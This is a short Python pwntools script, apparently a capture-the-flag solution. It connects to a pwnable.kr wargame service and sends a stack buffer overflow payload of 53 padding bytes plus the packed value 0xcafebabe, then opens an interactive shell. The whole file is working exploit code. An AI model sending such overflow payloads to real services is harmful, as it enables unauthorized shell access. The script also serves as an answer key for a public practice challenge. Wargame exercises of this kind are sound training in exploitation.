from pwn import *
key = p32(0xcafebabe)
p = remote('pwnable.kr', 9000)
p.sendline("A"*53+key)
p.interactive()
